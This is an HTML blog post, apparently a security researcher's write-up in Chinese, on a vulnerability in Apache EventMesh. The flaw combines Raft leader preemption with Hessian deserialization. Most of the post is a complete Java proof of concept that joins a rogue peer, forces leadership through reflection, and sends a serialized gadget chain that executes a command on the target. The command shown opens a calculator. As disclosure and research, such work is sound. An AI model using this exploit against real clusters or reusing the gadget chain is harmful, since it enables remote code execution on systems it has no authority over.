@@ -1,0 +1,560 @@
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<title>Apache eventmesh raft leader Preemption and Hessian Deserialization Vulnerability - yulate&#39;s blog</title>
+<link rel="shortcut icon" href="https://yulate.github.io/favicon.ico">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.2.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css">
+<link rel="stylesheet" href="https://yulate.github.io/media/css/tailwind.css">
+<link rel="stylesheet" href="https://yulate.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Apache eventmesh raft leader Preemption and Hessian Deserialization Vulnerability - yulate&#39;s blog - Atom Feed" href="https://yulate.github.io/atom.xml">
+
+    
+
+  <meta name="description" content="Creator: yulate 、X1r0z、Au5t1n 、h3h3qaq
+0x01 项目搭建
+从github克隆项目到本地：https://github.com/apache/eventmesh
+修改启动配置文件：eventmesh-r..." />
+  <meta property="og:title" content="Apache eventmesh raft leader Preemption and Hessian Deserialization Vulnerability - yulate&#39;s blog">
+  <meta property="og:description" content="Creator: yulate 、X1r0z、Au5t1n 、h3h3qaq
+0x01 项目搭建
+从github克隆项目到本地：https://github.com/apache/eventmesh
+修改启动配置文件：eventmesh-r..." />
+  <meta property="og:type" content="articles">
+  <meta property="og:url" content="https://yulate.github.io/post/eDeIu1qZbN/" />
+  <meta property="og:image" content="https://yulate.github.io/images/avatar.png">
+  <meta property="og:image:height" content="630">
+  <meta property="og:image:width" content="1200">
+  <meta name="twitter:title" content="Apache eventmesh raft leader Preemption and Hessian Deserialization Vulnerability - yulate&#39;s blog">
+  <meta name="twitter:description" content="Creator: yulate 、X1r0z、Au5t1n 、h3h3qaq
+0x01 项目搭建
+从github克隆项目到本地：https://github.com/apache/eventmesh
+修改启动配置文件：eventmesh-r...">
+  <meta name="twitter:card" content="summary_large_image">
+  <link rel="canonical" href="https://yulate.github.io/post/eDeIu1qZbN/">
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css">
+ 
+  
+    <link rel="stylesheet" href="https://yulate.github.io/media/css/prism-atom-dark.css">
+  
+
+  
+</head>
+
+<body>
+  <div class="antialiased flex flex-col min-h-screen" id="app">
+    <a href="https://yulate.github.io" class="fixed top-0 left-0 mt-4 bg-black text-white dark:text-gray-700 dark:bg-yellow-50 dark:hover:bg-black dark:hover:text-white inline-flex p-2 pl-8 hover:text-gray-700 hover:bg-yellow-50 font-bold z-10 transition-fast animated fadeInLeft">
+      yulate&#39;s blog
+    </a>
+    <div class="max-w-4xl w-full mx-auto">
+      <div class="shadow-box bg-white dark:bg-gray-600 rounded-lg pt-32 md:pt-64 px-4 md:px-8 pb-8 animated fadeIn mb-8">
+        <h1 class="text-5xl font-semibold leading-normal pb-8 mb-8 border-b-8 border-gray-700">
+          Apache eventmesh raft leader Preemption and Hessian Deserialization Vulnerability
+        </h1>
+        
+        <div class="mb-8 flex flex-wrap">
+          <div class="text-gray-400 text-sm mr-4">2025-03-03 · 8 min read</div>
+          
+        </div>
+        <div class="markdown mb-8" v-pre>
+          <p>Creator: yulate 、X1r0z、Au5t1n 、h3h3qaq</p>
+<h1 id="0x01-项目搭建">0x01 项目搭建</h1>
+<p>从github克隆项目到本地：https://github.com/apache/eventmesh<br>
+修改启动配置文件：eventmesh-runtime/conf/eventmesh.properties，开启raft集群功能，配置如下：<br>
+<img src="https://p.ipic.vip/nfimpm.png" alt="" loading="lazy"></p>
+<h1 id="0x02-漏洞分析">0x02 漏洞分析</h1>
+<p>org.apache.eventmesh.meta.raft.MetaStateMachine#onApply中存在反序列化漏洞，反序列化器采用的hessian2，反序列化数据可控<br>
+<img src="https://p.ipic.vip/oykvxh.png" alt="" loading="lazy"><br>
+Hessian 版本为3.3.6，很容易就能绕过黑名单<br>
+<img src="https://p.ipic.vip/2taa65.png" alt="" loading="lazy"></p>
+<p>本次利用和其他的有所不同，org.apache.eventmesh.meta.raft.JraftServer#JraftServer中使用rpc进行通讯，所以我们发送恶意数据的客户端也需要采用rpc进行处理<br>
+<img src="https://p.ipic.vip/b6zgov.png" alt="" loading="lazy"><br>
+得出结论后只需要使用raft特性进行leader抢占，发送message log通讯即可触发onApply方法</p>
+<h1 id="0x03-漏洞利用">0x03 漏洞利用</h1>
+<p>完整漏洞复现环境如下：<br>
+...</p>
+<p>完整poc如下：</p>
+<pre><code class="language-java">import com.alipay.remoting.serialization.SerializerManager;
+import com.alipay.sofa.jraft.*;
+import com.alipay.sofa.jraft.conf.Configuration;
+import com.alipay.sofa.jraft.conf.ConfigurationEntry;
+import com.alipay.sofa.jraft.core.NodeImpl;
+import com.alipay.sofa.jraft.core.State;
+import com.alipay.sofa.jraft.entity.PeerId;
+import com.alipay.sofa.jraft.entity.Task;
+import com.alipay.sofa.jraft.option.CliOptions;
+import com.alipay.sofa.jraft.option.NodeOptions;
+import com.alipay.sofa.jraft.rpc.CliClientService;
+import com.alipay.sofa.jraft.rpc.RaftRpcServerFactory;
+import com.alipay.sofa.jraft.rpc.RpcServer;
+import com.alipay.sofa.jraft.rpc.impl.GrpcRaftRpcFactory;
+import com.alipay.sofa.jraft.rpc.impl.GrpcServerHelper;
+import com.alipay.sofa.jraft.rpc.impl.MarshallerHelper;
+import com.alipay.sofa.jraft.rpc.impl.cli.CliClientServiceImpl;
+import com.caucho.hessian.io.Hessian2Output;
+import com.caucho.hessian.io.SerializerFactory;
+import com.fasterxml.jackson.databind.node.POJONode;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtConstructor;
+import javassist.CtMethod;
+import org.apache.commons.lang.SerializationUtils;
+import org.apache.eventmesh.meta.raft.EventOperation;
+import org.apache.eventmesh.meta.raft.JraftMetaServiceImpl;
+import org.apache.eventmesh.meta.raft.JraftServer;
+import org.apache.eventmesh.meta.raft.MetaStateMachine;
+import org.apache.eventmesh.meta.raft.rpc.MetaServerHelper;
+import org.apache.eventmesh.meta.raft.rpc.RequestProcessor;
+import org.apache.eventmesh.meta.raft.rpc.RequestResponse;
+import org.springframework.aop.framework.AdvisedSupport;
+
+import javax.management.BadAttributeValueExpException;
+import javax.swing.*;
+import javax.xml.transform.Templates;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.*;
+import java.nio.ByteBuffer;
+import java.util.HashMap;
+import java.util.Map;
+import java.util.UUID;
+import java.util.concurrent.TimeUnit;
+
+
+/**
+ * Hello world!
+ */
+public class App {
+
+    public static void main(String[] args) throws Exception {
+        RouteTable rt = RouteTable.getInstance();
+        Configuration conf = new Configuration();
+
+        // 恶意 Raft Server
+        PeerId evilPeerId = new PeerId();
+        evilPeerId.parse(&quot;127.0.0.1:5555&quot;);
+
+        // 目标 Raft Server
+        PeerId peerId = new PeerId();
+        peerId.parse(&quot;127.0.0.1:9091&quot;);
+
+        String groupId = &quot;EM_META&quot;;
+        conf.addPeer(evilPeerId);
+        conf.addPeer(peerId);
+
+        // 初始化 CliService 和 CliClientService
+        CliOptions cliOptions = new CliOptions();
+        CliService cliService = RaftServiceFactory.createAndInitCliService(cliOptions);
+        CliClientService cliClientService = new CliClientServiceImpl();
+        cliClientService.init(cliOptions);
+
+        NodeOptions nodeOptions = new NodeOptions();
+        nodeOptions.setElectionTimeoutMs(100000);
+        nodeOptions.setDisableCli(false);
+        MetaStateMachine fsm = new MetaStateMachine();
+        nodeOptions.setFsm(fsm);
+
+        nodeOptions.setLogUri(&quot;log-storage&quot;);
+        nodeOptions.setRaftMetaUri(&quot;raftmeta-storage&quot;);
+        nodeOptions.setSnapshotIntervalSecs(30);
+        nodeOptions.setInitialConf(conf);
+
+        // 初始化 JraftServer
+        JraftServer jraftServer = new JraftServer(&quot;tmp/eventmesh-meta-raft-hack&quot;, groupId, evilPeerId, nodeOptions);
+
+        // 刷新路由表
+        rt.updateConfiguration(groupId, conf);
+
+        // 等待初始化完成
+        TimeUnit.SECONDS.sleep(5);
+
+        // 获取当前term并设置一个较高的值
+        Field termField = NodeImpl.class.getDeclaredField(&quot;currTerm&quot;);
+        termField.setAccessible(true);
+        termField.set(jraftServer.getNode(), 200031);
+
+        // 获取并修改conf字段
+        Field confField = NodeImpl.class.getDeclaredField(&quot;conf&quot;);
+        confField.setAccessible(true);
+        ConfigurationEntry oldConfigEntry = (ConfigurationEntry) confField.get(jraftServer.getNode());
+
+        Method setConfMethod = ConfigurationEntry.class.getDeclaredMethod(&quot;setConf&quot;, Configuration.class);
+        setConfMethod.setAccessible(true);
+        setConfMethod.invoke(oldConfigEntry, conf);
+
+        // 设置状态为CANDIDATE
+        Field stateField = NodeImpl.class.getDeclaredField(&quot;state&quot;);
+        stateField.setAccessible(true);
+        stateField.set(jraftServer.getNode(), State.STATE_CANDIDATE);
+
+        // 直接成为leader
+        Method becomeLeaderMethod = NodeImpl.class.getDeclaredMethod(&quot;becomeLeader&quot;);
+        becomeLeaderMethod.setAccessible(true);
+        becomeLeaderMethod.invoke(jraftServer.getNode());
+
+        // 等待leader稳定
+        TimeUnit.SECONDS.sleep(5);
+
+        // 获取集群当前 leader 节点确认
+        if (rt.refreshLeader(cliClientService, groupId, 10000).isOk()) {
+            PeerId leader = rt.selectLeader(groupId);
+            System.out.println(&quot;New leader: &quot; + leader);
+        }
+
+        // 成为leader后同步snapshot
+        Method snapshotMethod = NodeImpl.class.getDeclaredMethod(&quot;snapshot&quot;, Closure.class);
+        snapshotMethod.setAccessible(true);
+        snapshotMethod.invoke(jraftServer.getNode(), (Closure) null);
+
+        TimeUnit.SECONDS.sleep(5);
+        System.out.println(&quot;Snapshot sync completed&quot;);
+
+        while (true) {
+            System.out.println(&quot;==================== send poc ....=======================&quot;);
+//            byte[] messageBytes = &quot;hacked&quot;.getBytes();
+            byte[] messageBytes = build();
+
+            // 构造并应用Task
+            Task task = new Task();
+            task.setData(ByteBuffer.wrap(messageBytes));
+            jraftServer.getNode().apply(task);
+            System.out.println(&quot;Task applied&quot;);
+            TimeUnit.SECONDS.sleep(20);
+        }
+
+
+    }
+
+    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
+        final Field field = getField(obj.getClass(), fieldName);
+        field.set(obj, value);
+    }
+
+    public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) {
+        Field field = null;
+        try {
+            field = clazz.getDeclaredField(fieldName);
+            field.setAccessible(true);
+        } catch (NoSuchFieldException ex) {
+            if (clazz.getSuperclass() != null)
+                field = getField(clazz.getSuperclass(), fieldName);
+        }
+        return field;
+    }
+
+    public static byte[] build() throws Exception {
+        ClassPool pool = ClassPool.getDefault();
+
+        CtClass ctClass = pool.makeClass(&quot;a&quot; + UUID.randomUUID().toString().replace(&quot;-&quot;, &quot;&quot;));
+        CtClass superClass = pool.get(AbstractTranslet.class.getName());
+        ctClass.setSuperclass(superClass);
+        CtConstructor constructor = new CtConstructor(new CtClass[]{}, ctClass);
+        constructor.setBody(&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;);
+        ctClass.addConstructor(constructor);
+        byte[] bytes = ctClass.toBytecode();
+
+        Templates templatesImpl = new TemplatesImpl();
+        setFieldValue(templatesImpl, &quot;_bytecodes&quot;, new byte[][]{bytes});
+        setFieldValue(templatesImpl, &quot;_name&quot;, &quot;test&quot;);
+        setFieldValue(templatesImpl, &quot;_tfactory&quot;, null);
+
+        //利用 JdkDynamicAopProxy 进行封装使其稳定触发
+        Class&lt;?&gt; clazz = Class.forName(&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;);
+        Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);
+        cons.setAccessible(true);
+        AdvisedSupport advisedSupport = new AdvisedSupport();
+        advisedSupport.setTarget(templatesImpl);
+        InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport);
+        Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler);
+        POJONode jsonNodes = new POJONode(proxyObj);
+
+        BadAttributeValueExpException exp = new BadAttributeValueExpException(null);
+        Field val = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;).getDeclaredField(&quot;val&quot;);
+        val.setAccessible(true);
+        val.set(exp, jsonNodes);
+
+        byte[] data = serialize(exp);
+
+        // 使用 ProxyLazyValue 调用非 rt.jar 内的方法, 绕过 ClassLoader 限制
+        UIDefaults.ProxyLazyValue proxyLazyValue = new UIDefaults.ProxyLazyValue(SerializationUtils.class.getName(), &quot;deserialize&quot;, new Object[]{data});
+
+        Field accField = UIDefaults.ProxyLazyValue.class.getDeclaredField(&quot;acc&quot;);
+        accField.setAccessible(true);
+        accField.set(proxyLazyValue, null);
+
+        UIDefaults u1 = new UIDefaults();
+        UIDefaults u2 = new UIDefaults();
+        u1.put(&quot;aaa&quot;, proxyLazyValue);
+        u2.put(&quot;aaa&quot;, proxyLazyValue);
+
+        HashMap&lt;Object, Object&gt; hashMap = makeMap(u1, u2);
+
+        SerializerFactory serializerFactory = new SerializerFactory();
+        serializerFactory.setAllowNonSerializable(true);
+        try (ByteArrayOutputStream bos = new ByteArrayOutputStream()) {
+            Hessian2Output output = new Hessian2Output(bos);
+            output.setSerializerFactory(serializerFactory);
+            output.writeObject(hashMap);
+            output.flush();
+            return bos.toByteArray();
+        }
+    }
+
+    public static HashMap&lt;Object, Object&gt; makeMap(Object v1, Object v2) throws Exception {
+        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();
+        Method putValMethod = HashMap.class.getDeclaredMethod(&quot;putVal&quot;, int.class, Object.class, Object.class, boolean.class, boolean.class);
+        putValMethod.setAccessible(true);
+        putValMethod.invoke(map, 0, v1, 123, false, true);
+        putValMethod.invoke(map, 1, v2, 123, false, true);
+        return map;
+    }
+
+    public static byte[] serialize(Object obj) throws Exception {
+        ByteArrayOutputStream arr = new ByteArrayOutputStream();
+        try (ObjectOutputStream output = new ObjectOutputStream(arr)) {
+            output.writeObject(obj);
+        }
+        return arr.toByteArray();
+    }
+
+
+}
+</code></pre>
+<p>漏洞利用图：<br>
+<img src="https://oss-smbot.oss-cn-beijing.aliyuncs.com/blog2/43f43c26-ef12-467b-93cd-0f25bbe86d88.gif" alt="" loading="lazy"></p>
+
+        </div>
+        <!-- Share to Twitter, Weibo, Telegram -->
+        <div class="flex items-center">
+          <div class="mr-4 flex items-center">
+            <i class="ri-share-forward-line text-gray-500"></i>
+          </div>
+          <div class="px-4 cursor-pointer text-blue-500 hover:bg-blue-100 dark:hover:bg-gray-600 inline-flex" @click="shareToTwitter">
+            <i class="ri-twitter-line"></i>
+          </div>
+          <div class="px-4 cursor-pointer text-red-500 hover:bg-red-100 dark:hover:bg-gray-600 inline-flex" @click="shareToWeibo">
+            <i class="ri-weibo-line"></i>
+          </div>
+          <div class="px-4 cursor-pointer text-indigo-500 hover:bg-indigo-100 dark:hover:bg-gray-600 inline-flex" @click="shareToTelegram">
+            <i class="ri-telegram-line"></i>
+          </div>
+        </div>
+      </div>
+
+      
+
+      
+        <div id="vlaine-comment"></div>
+      
+
+      <footer class="py-12 text-center px-4 md:px-0" v-pre>
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+</footer>
+    </div>
+
+    <!-- TOC Container -->
+    <div class="fixed right-0 bottom-0 mb-16 mr-4 shadow w-8 h-8 rounded-full flex justify-center items-center z-10 cursor-pointer bg-white dark:bg-gray-500 dark:text-gray-200 hover:shadow-lg transition-all animated fadeInRight" @click="showToc = true">
+      <i class="ri-file-list-line"></i>
+    </div>
+
+    <div class="fixed right-0 top-0 bottom-0 overflow-y-auto w-64 bg-white dark:bg-gray-800 p-4 border-l border-gray-100 dark:border-gray-600 z-10 transition-fast" :class="{ '-mr-64': !showToc }">
+      <div class="flex mb-4 justify-end">
+        <div class="w-8 h-8 inline-flex justify-center items-center rounded-full cursor-pointer hover:bg-gray-200 dark:hover:bg-gray-600 transition-fast" @click="showToc = false">
+          <i class="ri-close-line text-lg"></i>
+        </div>
+      </div>
+      <div class="post-toc-container">
+        <ul class="markdownIt-TOC">
+<li><a href="#0x01-%E9%A1%B9%E7%9B%AE%E6%90%AD%E5%BB%BA">0x01 项目搭建</a></li>
+<li><a href="#0x02-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">0x02 漏洞分析</a></li>
+<li><a href="#0x03-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">0x03 漏洞利用</a></li>
+</ul>
+
+      </div>
+    </div>
+
+    <!-- Back to top -->
+    <div class="fixed right-0 bottom-0 mb-4 mr-4 shadow w-8 h-8 rounded-full flex justify-center items-center z-10 cursor-pointer bg-white hover:shadow-lg transition-all dark:bg-gray-500 dark:text-gray-200" @click="backToUp" v-show="scrolled">
+      <i class="ri-arrow-up-line"></i>
+    </div>
+  </div>
+
+  <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+  <!-- Background of PhotoSwipe. 
+        It's a separate element as animating opacity is faster than rgba(). -->
+  <div class="pswp__bg">
+  </div>
+  <!-- Slides wrapper with overflow:hidden. -->
+  <div class="pswp__scroll-wrap">
+    <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+    <div class="pswp__container">
+      <div class="pswp__item">
+      </div>
+      <div class="pswp__item">
+      </div>
+      <div class="pswp__item">
+      </div>
+    </div>
+    <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+    <div class="pswp__ui pswp__ui--hidden">
+      <div class="pswp__top-bar">
+        <!--  Controls are self-explanatory. Order can be changed. -->
+        <div class="pswp__counter">
+        </div>
+        <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+        <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+        <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+        <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+        <!-- element will get class pswp__preloader--active when preloader is running -->
+        <div class="pswp__preloader">
+          <div class="pswp__preloader__icn">
+            <div class="pswp__preloader__cut">
+              <div class="pswp__preloader__donut">
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+        <div class="pswp__share-tooltip">
+        </div>
+      </div>
+      <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+      </button>
+      <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+      </button>
+      <div class="pswp__caption">
+        <div class="pswp__caption__center">
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+  <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+  <script src="https://yulate.github.io/media/scripts/main.js"></script>
+  
+  <!-- Code Highlight -->
+  
+    <script src="https://yulate.github.io/media/prism.js"></script>
+    <script>
+      Prism.highlightAll()
+    </script>
+  
+
+  <script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+  <script>
+    //拿到预览框架，也就是上面的html代码
+    var pswpElement = document.querySelectorAll('.pswp')[0];
+    //定义图片数组变量
+    var imgitems;
+    /**
+    * 用于显示预览界面
+    * @param index 图片数组下标
+    */
+    function viewImg(index) {
+      //其它选项这里不做过多阐述，详情见官网
+      var pswpoptions = {
+        index: parseInt(index, 10), // 开始幻灯片索引。0是第一张幻灯片。必须是整数，而不是字符串。
+        bgOpacity: 0.7, // 背景透明度，0-1
+        maxSpreadZoom: 3, // 缩放级别，不要太大
+      };
+      //初始化并打开PhotoSwipe，pswpElement对应上面预览框架，PhotoSwipeUI_Default为皮肤，imgitems为图片数组，pswpoptions为选项
+      var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, imgitems, pswpoptions);
+      gallery.init()
+    }
+    /**
+    * 用于添加图片点击事件
+    * @param img 图片元素
+    * @param index 所属下标（在imgitems中的位置）
+    */
+    function addImgClick(img, index) {
+      img.onclick = function() {
+        viewImg(index)
+      }
+    }
+    /**
+    * 轮询所有图片，获取src、width、height等数据，加入imgitems，并给图片元素添加事件
+    * 最好在onload中执行该方法，本站因放在最底部，所以直接初始化
+    * 异步加载图片可在图片元素创建完成后调用此方法
+    */
+    function initImg() {
+      //重置图片数组
+      imgitems = [];
+      //查找class:markdown 下的所有img元素并遍历
+      var imgs = document.querySelectorAll('.markdown img');
+      for (var i = 0; i < imgs.length; i++) {
+        var img = imgs[i];
+        //本站相册初始为loading图片，真实图片放在data-src
+        var ds = img.getAttribute("data-src");
+        //创建image对象，用于获取图片宽高
+        var imgtemp = new Image();
+        //判断是否存在data-src
+        if (ds != null && ds.length > 0) {
+          imgtemp.src = ds
+        } else {
+          imgtemp.src = img.src
+        }
+        //判断是否存在缓存
+        if (imgtemp.complete) {
+          var imgobj = {
+            "src": imgtemp.src,
+            "w": imgtemp.width,
+            "h": imgtemp.height,
+          };
+          imgitems[i] = imgobj;
+          addImgClick(img, i);
+        } else {
+          console.log('进来了2')
+          imgtemp.index = i;
+          imgtemp.img = img;
+          imgtemp.onload = function() {
+            var imgobj = {
+              "src": this.src,
+              "w": this.width,
+              "h": this.height,
+            };
+            //不要使用push，因为onload前后顺序会不同
+            imgitems[this.index] = imgobj
+            //添加点击事件
+            addImgClick(this.img, this.index);
+          }
+        }
+      }
+    }
+    //初始化
+    initImg();
+  </script>
+  
+    <script type="application/javascript" src="https://unpkg.com/valine"></script>
+<script type="application/javascript">
+  new Valine({
+    el: '#vlaine-comment',
+    appId: '2TlPRQUYNcF2YZZrESw4Ixr8-gzGzoHsz',
+    appKey: 'pRAtmeZWCUzNZ3MHKwdY9Igk',
+    pageSize: 10,
+    notify: true,
+    avatar: 'mp',
+    verify: true,
+    placeholder: '来都来了，不妨评论一下',
+    visitor: true,
+    highlight: false,
+    recordIP: true,
+  })
+</script>
+  
+  
+</body>
+
+</html>
